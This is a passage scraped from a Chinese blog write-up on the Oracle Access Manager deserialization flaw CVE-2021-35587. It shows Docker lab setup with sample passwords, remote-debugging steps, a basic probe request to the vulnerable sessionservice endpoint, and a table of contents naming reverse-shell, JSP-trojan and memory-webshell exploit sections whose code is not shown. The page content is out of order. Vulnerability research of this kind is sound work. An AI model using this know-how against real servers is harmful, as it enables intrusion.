DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 -p 8453:8453 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" docker run -d -p 15100:15100 -p 8454:8453 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" 修改oamms容器中的/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh 文件，在debugFlag变量被使用之前将其赋值为true。大约是在第419行这个空白行添加 debugFlag=\"true\" 。 重启oamms容器： docker restart oamms 将oamms容器中的 /u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/*.jar 和 /u01/oracle/coherence/lib/*.jar 下载到调试主机，添加到调试项目的library中。 在oamms容器中生成 wlfullclient.jar ，下载到调试主机，添加到调试项目的library中。 通过 docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log 查看错误日志 idea启动调试 在 oracle.security.am.pbl.transport.http.AMServlet#doPost 下断点 通过 curl -XPOST http://192.168.175.139:14100/oam/server/opensso/sessionservice 发送请求 这个时候idea就能成功捕获到断点了。 ①需要关注的容器和进程 由漏洞作者分析文章知道存在漏洞的接口为 /oam/server/opensso/sessionservice ，结合OAM搭建文档的服务验证环节，知道是oamms容器expose的14100端口上web应用的问题，故尝试调试该容器的web应用。\n修改oamms容器中的/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh 文件以将oamms中Java进程切换到可调试模式。方便我们通过idea挂载到oamms中对存在漏洞的Java进程进行远程调试。\n在空白行419行添加debugFlag=\"true\" 。容器中没有vim , ps , netstat 等工具，可以使用 yum install vim net-tools 进行安装。\n然后执行docker restart oamms，重启完成后进入容器可以看到进程已经以调试模式启动，并且监听在8453端口。\n但是此时oamms容器中的8453端口并没有expose出来。\n尝试通过将当前oamms容器保存为镜像，再重新启动的方式来添加映射端口：\n1 2 3 4 5 6 docker stop oamms docker commit oamms myoamms-image docker container rm oamms docker run -itd -name oamms -p 8453:8453 -p 14100:14100 myoamms-image docker run -itd -n oamms -p 8453:8453 -p 14100:14100 myoamms-image docker run -itd --name oamms -p 8453:8453 -p 14100:14100 myoamms-image 但似乎没有成功，界面一直停留在 Waiting for WebLogic Admin Server on oamadmin/7001 to become available... ，可能是新建的容器IP变动导致的网络通信的问题。\n干脆重新部署，在新建各个容器的时候添加映射端口。\n1 2 3 4 docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1 docker run -d --network=OamNET -p 8452:8453 -p 7001:7001 --name=oamadmin --env CONNECTION_STRING=172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST=oamadmin --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_PORT=7001 --env RCUPREFIX=OAM1 --env DB_USER=sys --env DB_PASSWORD=Oradoc_db1 --env DB_SCHEMA_PASSWORD=Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0 docker run -d -p 14100:14100 -p 8453:8453 --network=OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=14100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_server1 --env MS_HOST=oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" docker run -d -p 15100:15100 -p 8454:8453 --network=OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME=access_domain --env ADMIN_USER=weblogic --env ADMIN_PASSWORD=W3bl@gic --env ADMIN_LISTEN_HOST=oamadmin --env ADMIN_LISTEN_PORT=7001 --env MANAGEDSERVER_PORT=15100 --env MANAGED_SERVER_CONTAINER=true --env MS_NAME=oam_policy_mgr1 --env MS_HOST=oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 \"/u01/oracle/dockertools/startMS.sh\" 重新部署后按照上述修改/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh 后重启oamms容器，将oamms改成调试模式启动。\n②监控web应用日志 从docker logs -f oamms 可以看到oamms的web应用日志在/u01/oracle/user_projects/domains/access_domain/logs/这个文件夹中，访问应用时最新出现改变的文件是oam_server1-ms-oamms.log。\n因此执行\n1 docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log ③向漏洞接口发送基本请求 参考漏洞作者分析文章 ，向OAMMS发送一个 /oam/server/opensso/sessionservice 所能接受和处理的基本请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 POST /oam/server/opensso/sessionservice HTTP/1.1 Host: 192.168.175.139:14100 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36 Connection: close Accept-Language: zh-CN,zh;q=0.9 Content-Type: text/xml Content-Length: 294 \u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?\u003e \u003cRequestSet vers=\"vers123\" svcid=\"session\" reqid=\"req_1\"\u003e \u003cRequest dtdid=\"dtd1\" sid=\"sid1\"\u003e\u003c![CDATA[ 123 ]]\u003e \u003c/Request\u003e \u003c/RequestSet\u003e 看到日志中的报错调用栈为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 ","wordCount":"9647","inLanguage":"en","datePublished":"2022-07-14T19:40:55+08:00","dateModified":"2022-07-14T19:40:55+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/"},"publisher":{"@type":"Organization","name":"闲言语","logo":{"@type":"ImageObject","url":"https://ret2neo.cn/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://ret2neo.cn/ accesskey=h title="闲言语 (Alt + H)">闲言语</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://ret2neo.cn/mind/ title=随笔><span>随笔</span></a></li><li><a href=https://ret2neo.cn/about title=关于><span>关于</span></a></li><li><a href=https://ret2neo.cn/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>CVE-2021-35587：Oracle Access Manager反序列化漏洞</h1><div class=post-meta><span title='2022-07-14 19:40:55 +0800 +0800'>July 14, 2022</span>&nbsp;|&nbsp;<a href=https://github.dev/findneo/priblog/content/post/230515-oracle-access-manager-cve-2021-35587.md rel="noopener noreferrer" target=_blank>edit</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#%e6%bc%8f%e6%b4%9e%e6%a6%82%e5%86%b5 aria-label=漏洞概况>漏洞概况</a></li><li><a href=#%e6%9c%ac%e5%9c%b0%e6%90%ad%e5%bb%baoam aria-label=本地搭建OAM>本地搭建OAM</a><ul><li><a href=#%e5%a4%a7%e7%ba%b2 aria-label=大纲>大纲</a></li><li><a href=#%e6%ad%a5%e9%aa%a4%e6%b1%87%e6%80%bb aria-label=步骤汇总>步骤汇总</a></li><li><a href=#%e8%bf%90%e8%a1%8coracle%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label=①运行Oracle数据库>①运行Oracle数据库</a><ul><li><a href=#%e5%88%9b%e5%bb%baoracle%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label=创建Oracle数据库>创建Oracle数据库</a></li><li><a href=#%e6%b5%8b%e8%af%95%e6%95%b0%e6%8d%ae%e5%ba%93%e8%bf%9e%e6%8e%a5 aria-label=测试数据库连接>测试数据库连接</a><ul><li><a href=#%e5%ae%89%e8%a3%85sqlplus aria-label=安装sqlplus>安装sqlplus</a><ul><li><a href=#step1 aria-label=step1:>step1:</a></li><li><a href=#step2 aria-label=step2:>step2:</a></li><li><a href=#step3 aria-label=step3:>step3:</a></li><li><a href=#step4 aria-label=step4:>step4:</a></li><li><a href=#step5 aria-label=step5:>step5:</a></li><li><a href=#step6 aria-label=step6:>step6:</a></li><li><a href=#step7-%e6%b5%8b%e8%af%95%e9%93%be%e6%8e%a5 aria-label="step7 测试链接">step7 测试链接</a></li><li><a href=#%e5%85%b6%e4%bb%96sqlplus64%e7%9a%84%e7%94%a8%e6%b3%95 aria-label=其他：sqlplus64的用法>其他：sqlplus64的用法</a></li></ul></li></ul></li></ul></li><li><a href=#%e4%b8%8b%e8%bd%bdoam%e9%95%9c%e5%83%8f aria-label=②下载OAM镜像>②下载OAM镜像</a></li><li><a href=#%e5%88%9b%e5%bb%ba%e5%ae%b9%e5%99%a8%e4%b8%80oamadmin aria-label=③创建容器一oamadmin>③创建容器一oamadmin</a><ul><li><a href=#%e6%8a%a5%e9%94%99%e5%8f%8a%e8%a7%a3%e5%86%b3 aria-label=报错及解决>报错及解决</a><ul><li><a href=#%e6%8a%a5%e9%94%99%e4%b8%80%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5%e6%95%b0%e6%8d%ae%e5%ba%93 aria-label=报错一：无法连接数据库>报错一：无法连接数据库</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%b8%80%e4%bd%bf%e7%94%a8%e6%ad%a3%e7%a1%ae%e7%9a%84ip aria-label=解决一：使用正确的IP>解决一：使用正确的IP</a></li><li><a href=#%e6%8a%a5%e9%94%99%e4%ba%8c%e6%97%a0%e6%b3%95%e8%bf%9e%e6%8e%a5cdb aria-label=报错二：无法连接CDB>报错二：无法连接CDB</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%ba%8c%e4%bd%bf%e7%94%a8pdb aria-label=解决二：使用PDB>解决二：使用PDB</a></li><li><a href=#%e6%8a%a5%e9%94%99%e4%b8%89%e6%97%a0%e6%b3%95%e6%89%a7%e8%a1%8csql aria-label=报错三：无法执行SQL>报错三：无法执行SQL</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%b8%89%e6%89%93%e5%bc%80pdb aria-label=解决三：打开PDB>解决三：打开PDB</a></li><li><a href=#%e6%8a%a5%e9%94%99%e5%9b%9b%e5%88%9b%e5%bb%badomain%e5%a4%b1%e8%b4%a5 aria-label=报错四：创建domain失败>报错四：创建domain失败</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e5%9b%9b%e6%8f%90%e9%ab%98admin_password-%e5%af%86%e7%a0%81%e5%a4%8d%e6%9d%82%e5%ba%a6 aria-label="解决四：提高ADMIN_PASSWORD 密码复杂度">解决四：提高<code>ADMIN_PASSWORD</code> 密码复杂度</a></li><li><a href=#%e6%8a%a5%e9%94%99%e4%ba%94%e5%88%9b%e5%bb%badomain%e5%a4%b1%e8%b4%a5 aria-label=报错五：创建domain失败>报错五：创建domain失败</a></li><li><a href=#%e8%a7%a3%e5%86%b3%e4%ba%94%e4%bf%ae%e6%94%b9db_schema_password aria-label=解决五：修改DB_SCHEMA_PASSWORD>解决五：修改<code>DB_SCHEMA_PASSWORD</code></a></li><li><a href=#%e6%88%90%e6%9e%9c aria-label=成果>成果</a></li></ul></li></ul></li><li><a href=#%e5%88%9b%e5%bb%ba%e5%ae%b9%e5%99%a8%e4%ba%8coamms aria-label=④创建容器二oamms>④创建容器二oamms</a></li><li><a href=#%e5%88%9b%e5%bb%ba%e5%ae%b9%e5%99%a8%e4%b8%89oampolicy aria-label=⑤创建容器三oampolicy>⑤创建容器三oampolicy</a></li><li><a href=#%e9%aa%8c%e8%af%81%e6%9c%8d%e5%8a%a1%e5%8f%af%e7%94%a8%e6%80%a7 aria-label=⑥验证服务可用性>⑥验证服务可用性</a></li><li><a href=#%e5%90%af%e5%81%9c%e4%b8%8e%e5%88%a0%e9%99%a4 aria-label=⑦启停与删除>⑦启停与删除</a></li></ul></li><li><a href=#%e8%bf%9c%e7%a8%8b%e8%b0%83%e8%af%95oam aria-label=远程调试OAM>远程调试OAM</a><ul><li><a href=#%e5%a4%a7%e7%ba%b2-1 aria-label=大纲>大纲</a></li><li><a href=#%e6%ad%a5%e9%aa%a4%e6%b1%87%e6%80%bb-1 aria-label=步骤汇总>步骤汇总</a></li><li><a href=#%e9%9c%80%e8%a6%81%e5%85%b3%e6%b3%a8%e7%9a%84%e5%ae%b9%e5%99%a8%e5%92%8c%e8%bf%9b%e7%a8%8b aria-label=①需要关注的容器和进程>①需要关注的容器和进程</a></li><li><a href=#%e7%9b%91%e6%8e%a7web%e5%ba%94%e7%94%a8%e6%97%a5%e5%bf%97 aria-label=②监控web应用日志>②监控web应用日志</a></li><li><a href=#%e5%90%91%e6%bc%8f%e6%b4%9e%e6%8e%a5%e5%8f%a3%e5%8f%91%e9%80%81%e5%9f%ba%e6%9c%ac%e8%af%b7%e6%b1%82 aria-label=③向漏洞接口发送基本请求>③向漏洞接口发送基本请求</a></li><li><a href=#%e7%a1%ae%e5%ae%9a%e5%85%b3%e9%94%ae%e6%96%ad%e7%82%b9%e7%9a%84%e4%bd%8d%e7%bd%ae%e5%92%8c%e7%9b%b8%e5%85%b3%e7%9a%84%e4%be%9d%e8%b5%96%e5%8c%85 aria-label=④确定关键断点的位置和相关的依赖包>④确定关键断点的位置和相关的依赖包</a></li><li><a href=#%e4%b8%8b%e8%bd%bd%e4%be%9d%e8%b5%96%e5%8c%85%e5%88%b0%e8%b0%83%e8%af%95%e4%b8%bb%e6%9c%ba aria-label=⑤下载依赖包到调试主机>⑤下载依赖包到调试主机</a></li><li><a href=#%e5%bc%80%e5%a7%8b%e8%b0%83%e8%af%95 aria-label=⑥开始调试>⑥开始调试</a></li></ul></li><li><a href=#%e8%b0%83%e8%af%95%e5%88%86%e6%9e%90 aria-label=调试分析>调试分析</a><ul><ul><li><a href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%85%a5%e5%8f%a3 aria-label=反序列化入口>反序列化入口</a></li><li><a href=#%e6%9e%84%e9%80%a0sessionid%e5%af%b9%e8%b1%a1%e8%a7%a6%e5%8f%91%e6%ad%a3%e5%b8%b8%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 aria-label=构造SessionID对象触发正常反序列化>构造SessionID对象触发正常反序列化</a></li><li><a href=#%e5%85%b3%e8%81%94%e6%bc%8f%e6%b4%9ecve-2020-14644 aria-label=关联漏洞：CVE-2020-14644>关联漏洞：CVE-2020-14644</a><ul><li><a href=#%e6%9e%84%e9%80%a0%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96demo aria-label=构造反序列化demo>构造反序列化demo</a></li><li><a href=#%e8%b0%83%e8%af%95%e5%88%86%e6%9e%90-1 aria-label=调试分析>调试分析</a><ul><li><a href=#%e5%bc%80%e5%a7%8b%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 aria-label=开始反序列化>开始反序列化</a></li><li><a href=#%e6%9e%84%e5%bb%ba-remoteconstructor-%e5%af%b9%e8%b1%a1 aria-label="构建 RemoteConstructor 对象">构建 RemoteConstructor 对象</a></li><li><a href=#%e6%9e%84%e5%bb%baobject%e5%af%b9%e8%b1%a1m_aoargs aria-label=构建Object[]对象（m_aoArgs）>构建Object[]对象（m_aoArgs）</a></li><li><a href=#%e6%9e%84%e5%bb%ba-classdefinition-%e5%af%b9%e8%b1%a1m_definition aria-label="构建 ClassDefinition 对象（m_definition）">构建 ClassDefinition 对象（m_definition）</a></li><li><a href=#%e6%9e%84%e5%bb%babyte-array%e5%af%b9%e8%b1%a1m_abclass aria-label="构建Byte Array对象（m_abClass）">构建Byte Array对象（m_abClass）</a></li><li><a href=#%e6%9e%84%e5%bb%ba-classidentity-%e5%af%b9%e8%b1%a1m_id aria-label="构建 ClassIdentity 对象（m_id）">构建 ClassIdentity 对象（m_id）</a></li><li><a href=#%e4%be%9d%e6%ac%a1%e6%9e%84%e5%bb%bam_spackagem_sbasenamem_sversion aria-label=依次构建m_sPackage/m_sBaseName/m_sVersion>依次构建m_sPackage/m_sBaseName/m_sVersion</a></li><li><a href=#%e5%ae%8c%e6%88%90--classidentity-%e5%af%b9%e8%b1%a1m_id%e5%a1%ab%e5%85%85 aria-label="完成  ClassIdentity 对象（m_id）填充">完成 ClassIdentity 对象（m_id）填充</a></li><li><a href=#%e5%ae%8c%e6%88%90classdefinition-%e5%af%b9%e8%b1%a1m_definition%e5%a1%ab%e5%85%85 aria-label="完成ClassDefinition 对象（m_definition）填充">完成ClassDefinition 对象（m_definition）填充</a></li><li><a href=#%e5%ae%8c%e6%88%90-remoteconstructor-%e5%af%b9%e8%b1%a1%e5%a1%ab%e5%85%85 aria-label="完成 RemoteConstructor 对象填充">完成 RemoteConstructor 对象填充</a></li><li><a href=#readresolve aria-label=readResolve>readResolve</a></li><li><a href=#%e5%8f%8d%e5%b0%84%e8%b0%83%e7%94%a8readresolve aria-label=反射调用readResolve>反射调用readResolve</a></li><li><a href=#sink%e7%82%b9 aria-label=sink点>sink点</a></li><li><a href=#%e5%88%9b%e5%bb%ba%e6%81%b6%e6%84%8f%e7%b1%bbdefineclass aria-label=创建恶意类：defineClass>创建恶意类：defineClass</a></li><li><a href=#%e5%ae%9e%e4%be%8b%e5%8c%96%e6%81%b6%e6%84%8f%e7%b1%bbcreateinstance aria-label=实例化恶意类：createInstance>实例化恶意类：createInstance</a></li><li><a href=#%e6%89%a7%e8%a1%8c%e6%9e%84%e9%80%a0%e5%87%bd%e6%95%b0%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81 aria-label=执行构造函数（恶意代码）>执行构造函数（恶意代码）</a></li><li><a href=#%e8%bf%94%e5%9b%9e%e5%88%9b%e5%bb%ba%e7%9a%84%e5%af%b9%e8%b1%a1 aria-label=返回创建的对象>返回创建的对象</a></li></ul></li></ul></li><li><a href=#%e6%9e%84%e9%80%a0payload aria-label=构造payload>构造payload</a></li><li><a href=#%e7%9b%b4%e6%8e%a5%e4%bd%bf%e7%94%a8gadgetclassnotfoundexception aria-label=直接使用gadget：ClassNotFoundException>直接使用gadget：ClassNotFoundException</a></li><li><a href=#%e5%bb%b6%e9%95%bfgadget aria-label=延长gadget>延长gadget</a></li><li><a href=#%e7%a7%bb%e6%a4%8dgadget%e6%8a%a5%e9%94%99noclassdeffounderror aria-label=移植gadget报错：NoClassDefFoundError>移植gadget报错：NoClassDefFoundError</a><ul><li><a href=#noclassdeffounderror aria-label=NoClassDefFoundError>NoClassDefFoundError</a></li><li><a href=#%e9%94%99%e8%af%af%e5%87%ba%e5%9c%a8defineclass aria-label=错误出在defineclass>错误出在defineclass</a></li><li><a href=#%e6%8e%92%e9%99%a4%e5%ad%97%e8%8a%82%e7%a0%81%e7%b1%bb%e5%90%8d%e4%b8%8d%e5%8c%b9%e9%85%8d aria-label=排除字节码类名不匹配>排除字节码类名不匹配</a></li><li><a href=#%e6%9c%ac%e5%9c%b0defineclass-demo%e8%b0%83%e8%af%95 aria-label="本地defineClass demo调试">本地defineClass demo调试</a></li><li><a href=#%e6%b7%bb%e5%8a%a0%e4%be%9d%e8%b5%96%e5%90%8e%e6%9c%ac%e5%9c%b0%e5%8f%af%e6%88%90%e5%8a%9fdefineclass aria-label=添加依赖后本地可成功defineClass>添加依赖后本地可成功defineClass</a></li><li><a href=#%e4%bd%bf%e7%94%a8arthas%e5%9c%a8%e6%9c%8d%e5%8a%a1%e7%ab%af%e8%83%bd%e6%89%be%e5%88%b0remotable-%e7%b1%bb aria-label="使用arthas在服务端能找到Remotable 类">使用arthas在服务端能找到<code>Remotable</code> 类</a></li><li><a href=#%e5%b0%9d%e8%af%95%e4%bd%bf%e7%94%a8arthas%e6%b7%bb%e5%8a%a0%e8%87%aa%e5%ae%9a%e4%b9%89%e7%b1%bb aria-label=尝试使用arthas添加自定义类>尝试使用arthas添加自定义类</a></li><li><a href=#%e6%9c%ac%e5%9c%b0%e8%bf%9c%e7%a8%8bdemo%e5%af%b9%e6%af%94 aria-label=本地远程demo对比>本地远程demo对比</a></li><li><a href=#%e5%b0%9d%e8%af%95%e8%b0%83%e8%af%95oamms%e5%ae%b9%e5%99%a8%e4%b8%ad%e7%9a%84defineclass%e8%bf%87%e7%a8%8b aria-label=尝试调试oamms容器中的defineClass过程>尝试调试oamms容器中的defineClass过程</a><ul><li><a href=#%e6%af%94%e5%af%b9abclass%e6%95%b0%e7%bb%84%e6%98%af%e5%90%a6%e4%b8%80%e8%87%b4%e4%b8%80%e8%87%b4 aria-label=比对abClass数组是否一致：一致>比对abClass数组是否一致：一致</a></li><li><a href=#%e6%b2%a1%e6%9c%89%e5%b0%86%e5%ad%97%e8%8a%82%e7%a0%81%e5%86%99%e5%88%b0%e7%a3%81%e7%9b%98%e4%b8%ad%e4%bd%86%e5%ad%98%e5%9c%a8%e8%b7%a8%e8%b7%af%e5%be%84%e5%86%99%e6%96%87%e4%bb%b6 aria-label=★没有将字节码写到磁盘中，但存在跨路径写文件>★没有将字节码写到磁盘中，但存在跨路径写文件</a></li><li><a href=#%e8%bf%9b%e5%85%a5defineclass aria-label=进入defineClass>进入defineClass</a></li><li><a href=#jump-into-rabbit-hole aria-label="jump into rabbit hole">jump into rabbit hole</a></li><li><a href=#%e4%bb%8etransform%e5%86%8d%e5%bc%80%e5%a7%8b aria-label=从transform再开始>从transform再开始</a></li><li><a href=#%e6%9f%b3%e6%9a%97%e8%8a%b1%e6%98%8e aria-label=柳暗花明>柳暗花明</a></li></ul></li></ul></li><li><a href=#from-cve-2020-14644-to-cve-2021-35587 aria-label="From CVE-2020-14644 to CVE-2021-35587">From CVE-2020-14644 to CVE-2021-35587</a></li></ul></ul></li><li><a href=#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8 aria-label=漏洞利用>漏洞利用</a><ul><li><a href=#%e6%96%b0%e5%bb%ba%e7%94%9f%e6%88%90poc%e7%9a%84%e5%b7%a5%e7%a8%8b aria-label=新建生成PoC的工程>新建生成PoC的工程</a></li><li><a href=#genpocjava%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e6%a1%86%e6%9e%b6 aria-label=genpoc.java：漏洞利用框架>genpoc.java：漏洞利用框架</a></li><li><a href=#revjava%e5%8f%8d%e5%bc%b9shell aria-label=rev.java：反弹shell>rev.java：反弹shell</a><ul><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9 aria-label=优缺点>优缺点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c aria-label=最终效果>最终效果</a></li></ul></li><li><a href=#wjspjava%e9%81%8d%e5%8e%86%e7%9b%ae%e5%bd%95%e5%86%99jsp%e6%9c%a8%e9%a9%ac aria-label=wjsp.java：遍历目录写jsp木马>wjsp.java：遍历目录写jsp木马</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b aria-label=探索过程>探索过程</a></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-1 aria-label=优缺点>优缺点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-1 aria-label=最终效果>最终效果</a></li></ul></li><li><a href=#wjspxjava%e9%81%8d%e5%8e%86%e7%9b%ae%e5%bd%95%e5%8d%b8%e8%bd%bdjsp%e6%9c%a8%e9%a9%ac aria-label=wjspx.java：遍历目录卸载jsp木马>wjspx.java：遍历目录卸载jsp木马</a><ul><li><a href=#%e6%b3%a8%e6%84%8f%e7%82%b9 aria-label=注意点>注意点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-2 aria-label=最终效果>最终效果</a></li></ul></li><li><a href=#wjsp2java%e7%b2%be%e5%87%86%e5%ae%9a%e4%bd%8d%e4%b8%b4%e6%97%b6%e7%9b%ae%e5%bd%95%e5%86%99jsp%e6%9c%a8%e9%a9%ac aria-label=wjsp2.java：精准定位临时目录写jsp木马>wjsp2.java：精准定位临时目录写jsp木马</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b-1 aria-label=探索过程>探索过程</a></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-2 aria-label=优缺点>优缺点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-3 aria-label=最终效果>最终效果</a></li></ul></li><li><a href=#wjsp2xjava%e7%b2%be%e5%87%86%e5%ae%9a%e4%bd%8d%e4%b8%b4%e6%97%b6%e7%9b%ae%e5%bd%95%e5%8d%b8%e8%bd%bdjsp%e6%9c%a8%e9%a9%ac aria-label=wjsp2x.java：精准定位临时目录卸载jsp木马>wjsp2x.java：精准定位临时目录卸载jsp木马</a><ul><li><a href=#%e6%b3%a8%e6%84%8f%e7%82%b9-1 aria-label=注意点>注意点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-4 aria-label=最终效果>最终效果</a></li></ul></li><li><a href=#servjava%e9%80%9a%e8%bf%87servlet%e5%9b%9e%e6%98%be%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e7%9a%84%e7%bb%93%e6%9e%9c aria-label=serv.java：通过servlet回显命令执行的结果>serv.java：通过servlet回显命令执行的结果</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b-2 aria-label=探索过程>探索过程</a></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-3 aria-label=优缺点>优缺点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-5 aria-label=最终效果>最终效果</a></li></ul></li><li><a href=#memsijava%e5%ae%89%e8%a3%85%e5%86%85%e5%ad%98%e9%a9%ac aria-label=memsi.java：安装内存马>memsi.java：安装内存马</a><ul><li><a href=#%e6%8e%a2%e7%b4%a2%e8%bf%87%e7%a8%8b-3 aria-label=探索过程>探索过程</a><ul><li><a href=#%e8%8e%b7%e5%8f%96servlet-mapping aria-label="获取servlet mapping">获取servlet mapping</a></li><li><a href=#%e6%b3%a8%e5%86%8cservlet aria-label=注册servlet>注册servlet</a></li><li><a href=#%e5%88%a0%e9%99%a4servlet aria-label=删除servlet>删除servlet</a></li><li><a href=#%e4%bd%bf%e7%94%a8%e5%ad%97%e8%8a%82%e7%a0%81%e5%ae%9a%e4%b9%89servlet aria-label=使用字节码定义servlet>使用字节码定义servlet</a></li><li><a href=#%e8%a7%a3%e5%86%b3duplicate-class-definition aria-label="解决duplicate class definition">解决duplicate class definition</a></li><li><a href=#webshell%e5%af%86%e7%a0%81%e5%88%a4%e6%96%ad%e7%9a%84%e5%86%99%e6%b3%95%e5%87%ba%e9%94%99 aria-label=webshell密码判断的写法出错>webshell密码判断的写法出错</a></li><li><a href=#%e5%a2%9e%e5%bc%ba%e5%85%bc%e5%ae%b9%e6%97%a0%e9%99%90%e9%87%8d%e6%94%be aria-label=增强兼容，无限重放>增强兼容，无限重放</a></li></ul></li><li><a href=#%e4%bc%98%e7%bc%ba%e7%82%b9-4 aria-label=优缺点>优缺点</a></li><li><a href=#%e6%9c%80%e7%bb%88%e6%95%88%e6%9e%9c-6 aria-label=最终效果>最终效果</a></li><li><a href=#%e5%8f%82%e8%80%83%e9%98%85%e8%af%bb aria-label=参考阅读>参考阅读</a></li></ul></li><li><a 